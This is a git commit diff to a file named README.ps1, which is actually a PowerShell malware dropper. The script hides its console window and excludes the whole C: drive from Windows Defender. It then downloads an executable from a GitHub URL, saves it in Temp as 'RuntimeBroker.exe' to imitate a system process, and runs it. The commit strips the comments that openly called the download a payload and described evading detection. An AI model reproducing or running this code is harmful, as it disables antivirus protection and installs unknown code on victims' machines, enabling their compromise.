5413d9c3761fc3d0a269c472b989efb1c7775bae
LuisPhantom <trsaaptrsatrsa@gmail.com>
2024-12-08 23:50:20 +0700

    Update README.ps1

--- README.ps1
+++ README.ps1
@@ -1,5 +1,5 @@
 #############################################################################################################################
-
+# By RollBack UG
 # (Administrator rights are privileges granted to users that allow them to perform most functions on a computer's operating system.)
 
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -9,7 +9,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 
 #############################################################################################################################
 
-# (This prevents all commands from being visible in the terminal.)
+
 
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
@@ -24,31 +24,31 @@ $console = [Console.Window]::GetConsoleWindow()
 
 #############################################################################################################################
 
-#(By adding exclusions for Windows Defender with Add-MpPreference, the script enables the downloaded payload to run without being flagged.)
+
 
 Add-MpPreference -ExclusionPath C:\
 
 #############################################################################################################################
 
-# (Add the link to your payload.)
+
 
 $url = "https://github.com/LuisPhantom/Vemom/raw/main/Setup_Vemom.exe"
 
 #############################################################################################################################
 
-# (Temp is where your payload will be downloaded by default.)
+
 
 $output = "$env:Temp/RuntimeBroker.exe"
 
 #############################################################################################################################
 
-# (This belongs the script installs your payload not touch it.)
+
 
 Invoke-WebRequest -Uri $url -OutFile $output
 
 #############################################################################################################################
 
-# (Once the download is finished, execute the file that was downloaded.)
+
 
 Start-Process -FilePath $output
 
